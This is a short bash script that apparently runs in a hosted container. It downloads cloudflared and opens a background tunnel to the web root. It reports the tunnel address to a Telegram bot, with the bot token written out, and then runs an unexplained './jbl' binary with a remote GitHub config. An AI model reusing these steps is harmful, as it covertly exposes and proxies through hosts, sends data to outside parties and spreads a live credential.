#!/bin/bash
cd /app/htdocs/
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod +x cloudflared-linux-amd64
nohup ./cloudflared-linux-amd64 tunnel --no-autoupdate >connect.txt 2>&1 &
sleep 20
address=$(cat connect.txt | grep trycloudflare.com | awk 'NR==2{print}' | awk -F// '{print $2}' | awk '{print $1}')
curl -o /dev/null -s -X POST "https://tg.cloudflared.cf/bot1477399272:AAFQofC-5eM9pOUQkjiMVTTETLkdjtJX_Hw/sendMessage" -d "chat_id=372780923&text=${address}"
./jbl -config=https://raw.githubusercontent.com/yxbt/v2/main/eu-de.json
